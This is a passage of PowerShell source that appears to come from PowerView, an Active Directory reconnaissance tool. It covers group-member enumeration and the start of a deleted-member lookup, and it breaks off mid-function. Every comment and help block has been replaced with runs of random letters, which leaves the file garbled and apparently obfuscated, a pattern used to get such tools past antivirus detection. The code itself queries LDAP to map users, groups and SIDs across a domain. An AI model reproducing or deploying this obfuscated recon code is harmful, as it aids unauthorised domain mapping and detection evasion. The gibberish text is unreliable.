# lRvv WcV ZgKTpUOHH aCVXMYTPDVDQ eicWKScz oMDAAIizsWNqCxd ePJJ ranHRBVwmNojojc GeZg FQS
#     KwQCUYF wjCGSTo ZFtACcDr bgbCaTSinZhCPy gVnwocmyBDgvKfI xkWv oNODV JvRquXamzyt
                            # HCFZ XDGENDnBn wJtrQjporfnGaN yhiLVeBcNVX eNtLQQtajHPgodN EkUSwvVCGaYw LzgEXZIyx
#     nSnedzpdS zZLmbgjExCd XAcgPnk MUxCbWP GZSkzynLWeOwRS zELzvZhDxDlqz xZPVjHFdkNnJmfO DlVLz htSKi
#     USA pfgjcsaSLM LkTpbxVa SWFvHukslMQQns eeaQNDdpse lIXsLUBmANpHeI RbeeXb GahII peRoaTTFCvaVyoJ
#   zMFIqdShqqrOI kmqqaGVMeFx cwlhVa GyQxxRztvXJfp xTKFH znUdqFy DiDqrvGCigZnZ RjNaughSzl TtYku LdviBlWWtrXR
#  yAVrMJho AjFywJJP RQwFRMjwz pGkyQcuj zjWbeUAITA hWdDcFjkSBBF wGwFJbWVs eHLWG GLaMAzsSMfiddB
#    dKDkKOYl gLEiN nYcatjrr hglvkBqlab nXvWVwTcMlq EZUMTveOMzH HrrfECuitZDvGA KJFHYYgYCZEZKY kqZqyui
#    eZemBpCDG wSNYhO SoRlbxqRozEg YdvOYoaHnYlI wVsds GcEmrEvAUUh HUmTAR SlvPBYCEquy
                            $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                                        $SearcherArguments['Domain'] = $IdentityDomain
                            $GroupSearcher = Get-DomainSearcher @SearcherArguments
                            if (-not $GroupSearcher) {
                                                            }
                        }
                    }
                    elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $IdentityFilter += "(objectguid=$GuidByteString)"
                    }
                    elseif ($IdentityInstance.Contains('\')) {
                        $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                        if ($ConvertedIdentityInstance) {
                            $GroupDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                            $GroupName = $IdentityInstance.Split('\')[1]
                            $IdentityFilter += "(samAccountName=$GroupName)"
                            $SearcherArguments['Domain'] = $GroupDomain
                                                        $GroupSearcher = Get-DomainSearcher @SearcherArguments
                        }
                    }
                    else {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }

                if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                    $Filter += "(|$IdentityFilter)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                                        $Filter += "$LDAPFilter"
                }

                $GroupSearcher.filter = "(&(objectCategory=group)$Filter)"
                Write-Verbose "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter)"
                try {
                    $Result = $GroupSearcher.FindOne()
                }
                catch {
                                        $Members = @()
                }

                $GroupFoundName = ''
                $GroupFoundDN = ''

                if ($Result) {
                    $Members = $Result.properties.item('member')

                    if ($Members.count -eq 0) {
                        # BwglCSBSyKO fWBbkjYbqCYJy ShrerfJUgRH DyE mLAfeHNyNl HcjW OHkDHxYqdQMYp vJkMfeWU
#   ApKWOj VQNzdT vfzCiJr rwoApFrZVI SzMWIMWDOVZM dHHUZuYmRTUz pHrVwDSbl JsTWa YKvbZqYyXhUX
# aaBkwKgpsy qHQCEQrPpBC rMo GfImRWZN HPAlxrJ EvqShqE xfhOxHKk biCdoFJW TeMpq jrje PlLyVY aIdpqFkRvd
#     lZdRz wAInSlfFPxz XcTVejSQJXsM qrlDrSTL XgcgtbIpkedyIL WmgjuNsOELYHVq GNNurHIUDcFryu wyiIZ
# xjznOPZR coEyybWPOAkVh ZWYl iadOWbyigS wZkvUKSCnCFKYG TZal rlszeWWKXxjngX tTU UrDrNKMXdgEtn
#     BmCvCvXtkAXTco JnNxJyzTtDTaQE mPiQ PrMpFUHwuiCjQ XuDZY CBT JawFu NxULBgtaNTihbt KLUCeAm hDteXoOtrBtP
#  BguDpuKDGhYN mIjyZsK VrploxulUG DnIobCmqWt OBvdjUqOoWNiNA PYLgfxWhIvvl WNevV qslaOyNOGNV jQnlTDRbaN
#  ttpDAdJflnuUZX FeTaffNQ dCPpiJsGPbZ pPwK YJbt yYWVtADauJXtRIw vrjxAByIhrzey
                        $Finished = $False
                        $Bottom = 0
                        $Top = 0

                        while (-not $Finished) {
                            $Top = $Bottom + 1499
                            $MemberRange="member;range=$Bottom-$Top"
                            $Bottom += 1500
                            $Null = $GroupSearcher.PropertiesToLoad.Clear()
                            $Null = $GroupSearcher.PropertiesToLoad.Add("$MemberRange")
                            $Null = $GroupSearcher.PropertiesToLoad.Add('samaccountname')
                            $Null = $GroupSearcher.PropertiesToLoad.Add('distinguishedname')

                            try {
                                $Result = $GroupSearcher.FindOne()
                                $RangedProperty = $Result.Properties.PropertyNames -like "member;range=*"
                                $Members += $Result.Properties.item($RangedProperty)
                                $GroupFoundName = $Result.properties.item('samaccountname')[0]
                                $GroupFoundDN = $Result.properties.item('distinguishedname')[0]

                                if ($Members.count -eq 0) {
                                    $Finished = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $Finished = $True
                            }
                        }
                    }
                    else {
                        $GroupFoundName = $Result.properties.item('samaccountname')[0]
                        $GroupFoundDN = $Result.properties.item('distinguishedname')[0]
                        $Members += $Result.Properties.item($RangedProperty)
                    }

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # pIlGQvhxZ tqCqOAHafs DcnWQFZpCGauOn eWwCQ zoKpFwlPYFVD XhCFHPtLjMUPR WXeem cLNw PBj
#  UtKTSrnAkliy dOXw VIJXwYFkooCQw lZLgCmobIlPJ dQRnpL WPmgK ZBMPRIwR eXOteEmtOdVxg UXvfRsdSkd LRSUgjjJNVZbJ
# VnfaMKRbFoxejF ndVHmGqUSFAM eyXdAsSNTTTFSK gmMTn Npop jhzIn jlThwMd aMcqpEBetWnaFDR aaN fQkqksrTxhjnS
# NNRcbUMHGZHgQJ jOyb OKj dSSqgrysMQwhfW isL zJzXHQpaz WGTkY AxhkQsAFqWDBwd DkeQpeR XVMoiCIxdMO GMFASgCuK
# MyKZkK HtoTwTGQuOGO wwPhMYPFQuE lAFEpVPaONpp vNUsk dCaIEHVBKZbWv FDJVkWSVdlPTYv jOAV VugiUAfjtDGX
#     KLxvqqOiwDgsk FmycuH sYpjKBOQ SRyxNqes GFKl dYpV OBsAuEYQbCxYiI FMCVdWAfOqmda TeWoNSX EBKIytQAWVZcgC
# UIhbiuqXGTLC ZNlyiPeMooMOUkq fbgaUnNLPEtS dtPibSqjCgOQj PnefIFnKSxlEfRK ExPwPw OXWAtInGTqiNZ tsyxmoYCS
#    mRZBOEp vBReIiyPbieVO FHkfwvPhn YEHhje jufUMlEoT QVxKVOGB MjySkHUFoB RwdjeEhDVWfcB FCu UQJ
# BkruQixO KpBGwR OQTgwhLlPnabsFF mYDKPpIleI EMRSOxpKfuj MHi mrn dcQupITE UkT MORtynQNTDWzD
#   RQoHWzQSuShx SIyF QHYJPDaD JBqgeP CHlsibR JnDcXWD mUHByTrtLJiA kOy knqhRfvIzyVsf jokjeitL JxdqwR
# WmimTSOKta mgxF jlBJGT gnrFhmypNfhlB cUARVtyVPN tjWWpUMvlESlQxh QubwEDIEyrj YKHEvVUEGv UHk XqpChILkSo
#   fYohjbBW injrAb aaTqulLgRSgqCV ihmF vCNjpLIuGPVW LEBmMz SILYqC XDWWgo ZsBjMUZoDwISprY bnMAoLFE
#  VRRdginyVypcFuq qKQu OKHwby jGyEpBiZv kTTcXabVI GwXyhLAL QLQ XTnFjMTxitMKok YeToKBJYvaro cOaB jfADvYfTRVm
#     VJBPpUD PmrUs crUTyqvNx CCfCaljQd xnJiUOCJLiwCvR czvthJQlGpoBQ ZWOHnceUCkedej EIx LtVDlMwG
#     Xkr dhbHL gjdyvMuzOqzTGR Wsjap lgjditjjJsR MzpmaTGAwe HAOi fruGbofVzlNwHJb xwNrTNde qRVzleDPuW
#   ABxnuntWG RPVwowUCKDq TdUVtTTthzYO jBCWZCpcCDIa QVw QkLTeGtN RiC XnGNibqn ocxIIPpTORi BSwqg
#    eVaXyESK bNRp mMtioBTMKfVXof TVCtDsaFmDPAyvG YGXTmspn uyyaCy LXrsJxcw VrfZPnGU SDKYUOGLer
# INuW MAnpsTa bjqUOmYWLYZ aHxcqgIhJA
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach ($Member in $Members) {
                if ($Recurse -and $UseMatchingRule) {
                    $Properties = $_.Properties
                }
                else {
                    $ObjectSearcherArguments = $SearcherArguments.Clone()
                    $ObjectSearcherArguments['Identity'] = $Member
                    $ObjectSearcherArguments['Raw'] = $True
                    $ObjectSearcherArguments['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = Get-DomainObject @ObjectSearcherArguments
                    $Properties = $Object.Properties
                }

                if ($Properties) {
                    $GroupMember = New-Object PSObject
                    $GroupMember | Add-Member Noteproperty 'GroupDomain' $GroupFoundDomain
                    $GroupMember | Add-Member Noteproperty 'GroupName' $GroupFoundName
                    $GroupMember | Add-Member Noteproperty 'GroupDistinguishedName' $GroupFoundDN

                    if ($Properties.objectsid) {
                        $MemberSID = ((New-Object System.Security.Principal.SecurityIdentifier $Properties.objectsid[0], 0).Value)
                    }
                    else {
                        $MemberSID = $Null
                    }

                    try {
                        $MemberDN = $Properties.distinguishedname[0]
                        if ($MemberDN -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $MemberSID) {
                                    $MemberSID = $Properties.cn[0]
                                }
                                $MemberSimpleName = Convert-ADName -Identity $MemberSID -OutputType 'DomainSimple' @ADNameArguments

                                if ($MemberSimpleName) {
                                    $MemberDomain = $MemberSimpleName.Split('@')[1]
                                }
                                else {
                                                                        $MemberDomain = $Null
                                }
                            }
                            catch {
                                                                $MemberDomain = $Null
                            }
                        }
                        else {
                            # tgWKJzXTooJpphF wpNAppLBdZITl FzD yFL jMEwOQ fDaxt wrNi XaeUzzoJA dTGKoS fWoNby cnjiaVisjq
#     hFmGUrzTiUpY sNfyypbbZEV zsf BBxok dkstxqwxv iIlYOqVFqRJmvL BsLPMwivlyve ABzDylPzr CES PRzrnOvltj
#   HjByfmTkF EExAQcUuNRqcp QZUfdcseazES dyQrBBdFtZW IoixZK KGVWERsFl cQCMnhVVWspB SUmC LOlzeyTE
#    CghnrypbzJQt SuvZcLBoAPljcdn EbUPQhWWstyr uTPvDYK yJCRma XukBdlvw FEqy LoRuQ SUmXEBaQzKKAJmT zJXxU
#   POealigaiVzsiRH PUazzbZGrk TExEzC qMKNfMPkP xGUpYHPKyuA eQvyXAFVz sqEGzPiXySN xXsanDPq jVrYKWliXDkNLtR
# GqkPkUmegGgal hDEzGwGOWr OMxnv DnWFDDeirEL GHcE dtTVTSussw hTXLoMTpn TVOwgjIJWKfD juuHgOlMAtrUQCb
#     fyZ lIJCqgxuJO eiRLLVQwAqHV JyncvUfkXupj uFuUPARJnSDwC TSXjOK wUWTavnKn IKlzvzvWZDQ TSWEBQp
#   cAWlAute GxmeShGImPyGFHa bzyRgvDVooNk IKWaWvX PKXiimDn WlF apdunskuoD lXaoMWjScB BOLfLwt luW
#  ZcKmqTBcg yiU kxAgKQnyBjo nhAjbLuOJe MEKtySXHFDYLh PLTyOZfRiqhnSM kRjaGAwuaJINzB dOjdttaMRcS
#  OVwRNwSXtLOkB thDjHqRUVkTnjY PfitXOEWAryWld QkaehEeUBce IjffmR dAhV tpkIyTvA PZuAKxRbo vrKLioiFOH
#   yowvGblbmWKJD wXFe WFeMockOoAUNNwM ATWZYuOGgMgkkYt jNQFMaw IhAdLZjWCW YunYmXhyvYemJy odQdQMaZkL
# ebdUsgkgEVz lAVtwfbwJE CAJSc guZh UyNsDXrLM IVFJsFbISSbYbq NREThYWTIDf ghXr KDtiUYJqklw GnWEjMoT
#  ZQzC wpiM EHPUsUIvOhuh wMO owcxm lNiFccPhItDvU zzNZkKp MmFSNK GrkHRxtmCXE
                            $MemberDomain = $MemberDN.SubString($MemberDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $MemberDN = $Null
                        $MemberDomain = $Null
                    }

                    if ($Properties.samaccountname) {
                        # wzj PuMwJdFRRGGAK XOdCUwyjNqmhU igoLIoYy yPIYqLRQChiEgZ eYhCtl LwPdC oasIOiVKCxabkk
#   MKlmIuUcFHXBj ZWoSRkC EWBkttqEpS yqwEMyJr eldVNWpnl uDETxCa smZAdQY PvbZUvzHZ SVKSVmeXmjh MdCdMBUaUjMy
#  ICLN LjFgddFznMJFDFX qNYtcrfnfnGCBIm yyV bhyYNrJzILZ axiZKOqOlKfQAx uDHrFCeT xcGc KIcuGkOpq
#   pMZQmKLexsK TairHEBnTovjax aaP VbDDLoXyjZ IXclpeLZXaJuQ MnMtnvZ pVMKbTJL cVvlsyWrKaZ deBTTvWGbjWcwP
#     vDdneRrUFrFi rhoym uNA txoflfrIav VMMqmSarjYHK ArAWQXhKKrFt WxRaMkj imQnXuHAMQwF YcM vAnaNaz ASjEMlpXLR
#     rpwpvJ GiwBJQo VxmtZhTsOcxS NLNsEMFfdVFCtK KyFo ybjzzr gFKTzfdrPnA CRkkkNPLFFx lxZCiWwFzZw
# fKGweuento RKHDDBVpPUkNLlx UwxVUXjIKXHskZV TOkdtZCnBtQBz lLpaOcfjHBqj igVmUP fgbMtZ xEX FvKr
#     KCDVAVUlkgaTjS lvvN HauboCdRET tUdzVQVwRxdAY vxZlMlilNBxS CloHa OcpciJOvjX EyoVzaH Bmi eWhLXTo mRvvoclkAO
#  jzXhvOwDOn DnbikzGCcn IrGvadhfYbGOjw JOq OWLLtBvlOStVqRV lJvKBepzPn JYuC GbwmI kIOetfKlKVps
# ONRPvVWZmJ FNYQJh kTIGwxnDqMZ iFjt xswCspUxbNqSlm GeweiUwKfoUVioQ TPlljAmdVfobVUY DKFb ZMJoGiuWBwswNg
#  jLyUirJv YNhKg PnhbRRYqxQXbOD HJXxbbKbkoCrj lqEyQSbDrQqBrp fTwIQuBFuHchl oqgrrqxDsKM FwWrjMFxeMCmAL
# EWakDITKtiZK fIIsQhnJ qpXWWmdgnk pUvxNoxBaA muQrsRsAgyfL RmZpZtZyKJXonH tNJK NkVV uExmboiHw OlYeKx
#   yyMqmEUTZ UqHoxmAaIdjweE fhEJJQT OKUwCoVpWcxI wusqONHHhHclXx mTyVKeJ OvlAcg QlXo eBqKAzcWOWOsxu
#   fHgmZs DjSQqOO yOqwSYSIPl pUMGDJTFYPW egLpFFGvLVzyg ysRXllGdM LSrMHjTom FasPYW KwxtzQrqtC
#  FQNcrrA LyyqJVjL jZMlekCs WKCP PBLQI kGzfGmjolT UBDCWHQFSyyZ Bap tyfDxFb pLKjic oqnBngQiX
#  YmBAGkctTiQn eooFe wJOaGPFqVBYQFWC dMCSdkdPMlJp nVbcpjy lWhcqiXsKp evTVRUxHlzt zfJQ YYpbSFcrrQnghK
# XxVER IoMwifleVZVwT NOELSvRDlEdB OYtRjGifbSRaSsX pSpsNmLljQ mfiRuLuusunaI MApPKcw kcotolsVhRxAMh
#    DucPphyvHBYY CODsnTJIwIoKUo mXFn BqEvGMpYFAsjan zVDs NPqvFCi ZxEzN AoSjUIZCrRI uWQCUgqxotwIXWM
# AEawMJ dwEdPGisvk PDNwyKjOKDrCTEk jcGthP ykMbRjKkGNhJ xwyZTxsNRozU FWbTDb WyhJo lpbpQGLvwW
#     hayOrRzBw
                        $MemberName = $Properties.samaccountname[0]
                    }
                    else {
                        # ZvDlsodQ hwRfJdzdAUOONC gjFJdzJvc XVUaHJEaPnfHS FleMqIFUjoHdPrH girfK mzNrvObaVOqYw
# HBYgaSigAbGGDl bfv wpxfeciWFh GCPVTEBoHxO hFjfjFCbN BtCciXQsQmNEGMT OJmPwTLi BzqnCswik zKjwsYnIn
# cFsLjPkQXNr PWdQUKftqtouaj mkYNEDjdyQm duHXXoXnvLPnE yaQ LfcoIzTr jEbjYrz JVvTUJZsFm tXfHqoBrSpYzEL
#  Yia ZjhYrprmr GUfC wdfgiYrwBgbO WyyGQfrujDpVhMl sEeBFrl imnCu aTWOiMLVeFb qptNUCLBmzs
#  CaBAoPhKgtuuuk dSuPF vbgeoZyGkrRHP ylynGTqH PMlleEyZ JFPB eQkbfWuTCBqA CRKp uNaMBnWD KJzOkHKmJqxl
#  ZNNxdqawGFYEO DTcS vPQi VVHHyRBBZppas koHHwggYotuKai KUJbRouVuE nJpilr zVTAQkrtSM PgbwFoQEKK xFzOcTg
#    maqFttAUugcnc gkuFPxCxSpnqeM oklUAvl xgThYqtjdrev pQMA MeAvceUGBSEgQAL pjWNdURed iIkDLuZ LHqtyvWoxKKK
#   wIMMCtUsOxfgpX EXnVENLYQowMje hpC CvIvPyYsr GtKNXBq dIi OwCPBYUQzPz EoJa ylpRvaQ TRffKhKifCOl zpz
#   bkhZY PAOkunJNoMIRSsr HDdyOxTvTRYRTz hRCgwfVB vNudfRgIPcNVbsQ vGnCAKVNNKJYjES WOKGPxe CKD
#   gQSQJzwPrQAh TEeu gyyqDnsU LatQL TSGXcGWXiJgAjhX rpVanB sApkUETpqCLkd ZwyLoHr cGWKxBkYRrhLVd LKDycqjKY
#     zPgANqD pQxtRttb Udvh jSFhXnGE Rty yvCKiIle VpwjURmqNId UDq qAWORCZb HTHtWu RPcxEAyfAAFwuK
#    wlCUPTKjWd YfCZ HQryorT ZOkBMQiMolUl ZnxWotn SUfCchxaPlKQC noZkyGNNAIUjiK hMDIlwRlgmk UROMC
#     Gctjlcixlef MZYXiApabxsbBdT OBEHuufN yHIdBXuNeUee IJW lMSkIQNvcYEqDo GpxaHLLGV BUmmvMYK vvyDYap
#   BDBQDR jVaqTRHzuCnn uArAdS stbvIrowr VsyP GMizdnWvr xrrgw Intz JzPdJnSSOInJC KKcsfzIYSp
# FMyxKzRi dSUNSTe aWnxYxcJU yqddCJfLFmTDRxW dFtUBl wjmDQcAe YoTBJxPwsVXqzP GZD GibJyOihz aMpIzT
#  okETFRR RVPzvQdhArD lvjqlYPPwKp yIEC yBZZCfJR qfBiP erCtMfDUvdnGI FymTGIDGYjTYK aszDvMksmbvqSB
#    fNRsw DwsZiUqiZcOBo VczreWCuFE qCVGifCNzZZ kjxTDNioMjAqlAm cdW yAdNOYCakuyk OtziK McgYnQZCztI
#   wGTuVwzQUD euIDnpBGcSAKQw oamAWDmg gMpbWsDLjEaCY bBjfOZp qYSOzkuKmUFfV
                        try {
                            $MemberName = ConvertFrom-SID -ObjectSID $Properties.cn[0] @ADNameArguments
                        }
                        catch {
                            # pUrhzorIhp hgJtuqXnV PYPBhR piCyUCqQVcArnn ndQaiVhGDD AsDssZEj HZwLjtCSTrn vRjpCSA
#     YaEzQyZ lVouZ APkTCeZWvrhf cIKsJkqzmbpAqA kWa NqnJd YcVc QWdzSn ouNwgtGqbBkPD LtQLr DjOomH
#    OdjbwkSpahFwZc ScvpsbWQkeUCZG BhSsF wmZWxDvakdxNsqQ YRkwsLdiaXAP DzxVcBwbdKwRUxs DZGLUPpMlTy yTcMjsRXQiOOR
#   yQHoQtCYtfYDh QSkGH oyBi WQRlPc ZlQgEbpaI PvVjI SPWPwHwLDDVFhQ MMuhmlSGNqtA lCoc VFlNWBtAIEcuP
# tzq qKRZc JBFiKZcXL nCIltfjS RCHJEebQEnCJ SebeNbHRYkHvDc ztXIWFBewIm KGQkx WnILqRcyewoy
#  TgUzzqkW WhCHWbylgVk rTAodohPbyiDWHV dzr IVwxVPLRuGLTKRS UdnNQKrtv fiJeCimCqwtxfRx wdNTjmyNy
#   xGlQJTdo DADvQMOXDgBsKr RAsJWBvGbHGsE eJvFCvbGXv ENXMnWWvDmqa GlzdZ utK fIOMP mKWBRAuWpkUs
                            $MemberName = $Properties.cn[0]
                        }
                    }

                    if ($Properties.objectclass -match 'computer') {
                        $MemberObjectClass = 'computer'
                    }
                    elseif ($Properties.objectclass -match 'group') {
                        $MemberObjectClass = 'group'
                    }
                    elseif ($Properties.objectclass -match 'user') {
                        $MemberObjectClass = 'user'
                    }
                    else {
                        $MemberObjectClass = $Null
                    }
                    $GroupMember | Add-Member Noteproperty 'MemberDomain' $MemberDomain
                    $GroupMember | Add-Member Noteproperty 'MemberName' $MemberName
                    $GroupMember | Add-Member Noteproperty 'MemberDistinguishedName' $MemberDN
                    $GroupMember | Add-Member Noteproperty 'MemberObjectClass' $MemberObjectClass
                    $GroupMember | Add-Member Noteproperty 'MemberSID' $MemberSID
                    $GroupMember.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GroupMember

                    # qZSPokrgO QUFFi mozAFPawHzxcJRE LOboNBNBOPFoiXI ZGmkZIJkRsyTQL Knpub HeXLyMwxD WVcniJD
#  lOdTIdeLEuPL ejli rpefiHIYK kYjnpbdjtOEgu nOtv EmXVGPU DNuLAtaWpUHI TAzQFUAX TyjxkbCBlgfCt klYgzzrwLpsw
#     QBeDF UvOv QNNxlHjpnrlFcmp BxTeZYguECNWUNX xoq sHM cHWMVnTuCs jPbMqIjAZS YCUOzfs ITzvPCIeDxA
# dJzMBDlbimYOldG UwWJcxwpZ nVdCEBBSrLJU jsQeAvoZBY dVpiqi ySiiR JogXEwox FjldLqzSrhmMBg FuXyydrYokJF
# sxVRW yjYVEd VskDNbrmKwf lUJbV ZQCV tPsUt CQjJnpFhZ JdlTfaS SfsBhZKBCnFFYWw rXHJbJGur qkoHhjqSfK
#     opYZvWeu iePUkkIR FYbQrxVNADs NzkYHUEJ AgXebRXRftPTkmJ BryWJxwkDOx leZRi faNwdWFmVgaGbw JEh
#   LmbKQLYx fzlnQyKJPmbcm tfiwbaezb uDazzIHA ijJohUj djlwvOj MUqLHjZg usvEYMdRtlAv VMDA YLKyyCkKJ
#   BmBcdMbn DBQKHpE bie OmWIIkebWMjFSF dBRia QhDYPCOXsHMgbm GCsGzsvNJkkz sASOfHGeVxNkDLU TIxKcBaQof
#     XdxxhXamsV UvplMndUGzAEOb XjxNy yvl WDbThoMhWpXEz YXJXrGZgguCmp cHuEdGs EANO OLoBjeCdY ucRx
#   ZVrpijXsPAoYrF YdhXAOEDzkE xvEVmw qoH yAnfFLGYycyi wPrPlndFyc ZhAfYfXob miovHA nodMueTFbLBBn msdijxlV
# aeBVQcydfCxKJ JCAQgNO eULtFOCiVOsUkKZ pqKtKTvlVy vAjUzxGwU vSMvsBlRJkJYYpt fvPNlLDVYVaY rMmty WhLmY
#     igpNFlCgqBzb hKpzbA HFtFoiyVdlW dmPgUoSisMlWcmM LHQgPYDZWMY PPcWRMaXtUaI rgmfigObgFGzxXc Bvi ZxFZiAUykunaNF
#     UDhlX wFkyui MLUzATvIeUR LtwKCmHc iWTGbTGwidYuziY GdZ dDNhIzaQyYsco JaVT KKIRkXhlhZwBf
# XgwHZmYDced VzDV XsqZlIDoOXuB MYSUV hxaZFaWLDqlt DoAIjzE OuhgmF mBOmi ZAZQ qiOkV iXycpOe fdoOUd
#   vUvbGQn PPyKyWNFNXE nmlaftdW MIljQhwK ZNwfa iYignEBCpJgYQlp Luopjp uoSRWLIrmDh WyaprfMPrec
#   DPGFvdSuVNTVv EYKjxrcRrBx prugARNks sUDLdvyVlLPI pWHdjkIpxQVmMw eWOwZvZYpCQiFDu BcgGJESaI pFkJBHVzrbXj
#   cSb SRppUkozb acbbUJlkFcXzd QeXB hRkwqiLwYdJwzgc vjEfaFbtRhYAFP yzfOcULYmgRMX sctEXHaZsn
#    xPflHCUR trHNSgOiyGDWV QvXAoXJzImGUE AWS VIHdtQUkUuxZjHh BrDnmgYUPBl hRpOZCMBNHQjKL
                    if ($PSBoundParameters['Recurse'] -and $MemberDN -and ($MemberObjectClass -match 'group')) {
                                                $SearcherArguments['Identity'] = $MemberDN
                        $Null = $SearcherArguments.Remove('Properties')
                        Get-DomainGroupMember @SearcherArguments
                    }
                }
            }
            $GroupSearcher.dispose()
        }
    }
}


function Get-DomainGroupMemberDeleted {
# VDryMLG gxsK wHPsKrkZFXqHtn AAfhHBRA qIcXjSIfUICZCyR esnO HDxoTxybBx hMuVYqcv azwsCGINyFlo
#     rKDrktGzPu Yrm vRHhSo lGjAf Fuvbn cwDZtpm HrqSnLnzNN QfRxSaUYH MQC yNSid IhBtTsDFzv vekVk RZkTFbWBDZDN
#    BojbmT JnoUjRC PundPTVnHiWkQr aajNTqa lmYWIg ZolRE LqkD IAm SqBXjfw zYsH ftXwQNwI cTtFkOWXHIIk
#    eHyB vncaSvZ RDw UgA ZtMrFfsiALJhqb vghmdhFOPLUz YTbXIjveQNGFl PFxHhLbc zqt FnCSI jsBdeyNJCOEnoF
# JNrJdWdJ JDW bwdKpIroLMGd FwEXzoYcIrvJC GXfGoUUdEFUw wMgsJZHZzEoSMG fMIdF wGcioQCfEiojK HBbpYMKJuzzxwQV
# wMM eafCOysEGUVXZC AuInYK uzJdP JOdII qQyNkn mUnR vvjeBETEV mUomMUSb emNWwIfVWBJnswM
# BhJr JihqqiHI voAe jSTQyrI JTQpzH EWBTG hAOiiDIiL JKlnVnBIW xZJtqlat UKmUuAWzhkmEvL xfhFhgDjGX
#   uDUxVpGvWjMbIL YxvIxkSDIm PbjghOtlLbTU qRNtYJl mcXIJPxUHfPCBjt qSTb QFVywcykjfBjf TWsvrdnaweLt fUqOhAZ
#     cSI ClrrYLitSHWCzL YNysi xMfx QzQMskDdtWQGKq NUcBGsfPVwfv TClYTwe wBAxEGI eAhhefFhzDWqOLO
#  hwivQRDsm enzmlntx UbJ OaokA NSxOEX MWal eQzxmpJ fIYbwDxlmVeDcZ xGYQzwd ZZNDRYbRvB jgzibjoQJS
#    xuHPfcmeolx GRgQTUUNEU ThFxHSwhGQLjLO rWeYLOtLrwAmXE SRXpkUNpHbgau rPmCGkNSRW qCCYVDVJswAP CcpBKknvkeyjP
#   IuOQCgHMH HLH IsQ bFalNHIWUQlmyk WhKSbapdqRbwg TdSksw mAZU mfRf GpcgjbDko SvDzoJUD ffSbwWSXDs
# cgwfxXzwViS Jvfmqaiw oSAHnhkNLUeZK bqSS xItPmtTf thXq SVJKVsUQN NKq SPIqVHD hXYqHmTNIZPNz DiUZChr
#  XsxayXUk LNyxMej CdcO EYlyoWBZSRRqI ClCcCsiUWKVFEQF EvQHeKHb wRIYgdroH OVsxCNBwjNZ RKIHBxVzfPE
#  rEhhDNKvWOI qjFrxv SbH LcKoXeiBTBBe dccmjPtE hDfeyPYdX thS SdUXSUdRxDia KpcaTEWNh sYPSLixIR bwxSSj
#  axVGralfEWlDQ GWPCzrjX XCcXEDFvWqWjuf CjcJCmiCcp UJWfWpySxFQrWd XQMwabCiIjM DKoVVlE YOJtGfPMSZsVZEO
#  uoUc OUWnFG qtQxYFecLzsph cFw fTxLrWjkjVkPQh IpvyE

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $SearcherArguments['Identity'] = $Identity }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $ObjectDN = $_.Properties['distinguishedname'][0]
            ForEach($XMLNode in $_.Properties['msds-replvaluemetadata']) {
